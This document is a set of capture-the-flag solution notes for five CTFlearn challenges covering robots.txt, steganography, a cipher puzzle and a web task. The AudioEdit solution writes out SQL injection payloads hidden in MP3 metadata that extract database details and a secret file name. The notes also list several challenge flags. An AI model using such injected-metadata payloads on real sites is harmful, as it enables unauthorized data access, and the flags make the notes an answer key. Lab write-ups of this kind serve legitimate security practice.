# CTF题目 June. 25th 2021

## [Easy] [Web] Where Can My Robot Go?

Where do robots find what pages are on a website?

https://ctflearn.com/challenge/107

Hint:

> What does disallow tell a robot?

```bash
User-agent: *
Disallow: /70r3hnanldfspufdsoifnlds.html
CTFlearn{r0b0ts_4r3_th3_futur3}
```



## [Easy] [Forensics] Simple Steganography

Think the flag is somewhere in there. Would you help me find it?

Hint-" Steghide Might be Helpfull"

https://ctflearn.com/challenge/download/894

```bash
myadmin
steghide extract -sf Minions1.jpeg
AEMAVABGAGwAZQBhAHIAbgB7AHQAaABpAHMAXwBpAHMAXwBmAHUAbgB9
.C.T.F.l.e.a.r.n.{.t.h.i.s._.i.s._.f.u.n.}
```



## [Medium] [Miscellaneous] Ambush Mission

Hi, i can't tell you my name since now i'm in a mission. In case to arrest our fugitive target, our team had been intercepted communication between the target with his fellow and found this image (https://mega.nz/#!TKZ3DabY!BEUHD7VJvq_b-M22eD4VfHv_PPBnW2m7CZUfMbveZYw). It looks like they are going to meet in specific place, but we still don't know the time yet. Can you help me?

![image-20210626093142961](C:\Users\ender\AppData\Roaming\Typora\typora-user-images\image-20210626093142961.png)

```bash
StegSolver.jar
```

![image-20210626093210310](C:\Users\ender\AppData\Roaming\Typora\typora-user-images\image-20210626093210310.png)

![image-20210626093250308](C:\Users\ender\AppData\Roaming\Typora\typora-user-images\image-20210626093250308.png)



## [Hard] [Cryptography] The Simpsons

Ya know, I was thinking... wouldn't the Simpsons use octal as a base system? They have 8 fingers... Oh, right! The problem! Ummm, something seems odd about this image...

https://mega.nz/#!yfp1nYrQ!LOz_eucuKkjAaDqVvz3GWgbfdKWn8BhussKZbx6bUMg

```bash
Ahh! Realistically the Simpsons would use octal instead of decimal!
encoded = 152 162 152 145 162 167 150 172 153 162 145 170 141 162
key = chr(SolutionToDis(110 157 167 040 155 165 143 150 040 144 151 144 040 115 141 147 147 151 145 040 157 162 151 147 151 156 141 154 154 171 040 143 157 163 164 077 040 050 104 151 166 151 144 145 144 040 142 171 040 070 054 040 164 157 040 164 150 145 040 156 145 141 162 145 163 164 040 151 156 164 145 147 145 162 054 040 141 156 144 040 164 150 145 156 040 160 154 165 163 040 146 157 165 162 051))
key = key + key + chr(ord(key)-4)
print(DecodeDat(key=key,text=encoded))

How much did Maggie originally cost? (Divided by 8, to the nearest integer, and then plus four)

847.63 -> 105.95375 -> 106 -> 110 -> n
n + n + ord('n')-4 -> nnj
Vigenere Key: nnj
Encoded: jrjerwhzkrexar
Plain: wearenumberone
```



## [Hard] [Web] AudioEdit

I made this cool site for editing audio files. Can you exploit it?

http://web.ctflearn.com/audioedit/

```bash
ffmpeg -i .\file_example_MP3_700KB.mp3 -metadata title="test" -metadata artist="1', (select version()) ) -- " out.mp3
Title: 5.5.58-0ubuntu0.14.04.1
DB:audioedit
TABLE:audioedit
COLUMNS: id,file,author, title
ffmpeg -i .\file_example_MP3_700KB.mp3 -metadata title="test" -metadata artist="',(SELECT file FROM (SELECT * FROM audioedit) AS x limit 0,1)                   ) --   " out.mp3
supersecretflagf1le.mp3
```

![image-20210626100626295](C:\Users\ender\AppData\Roaming\Typora\typora-user-images\image-20210626100626295.png)

![image-20210626100644329](C:\Users\ender\AppData\Roaming\Typora\typora-user-images\image-20210626100644329.png)

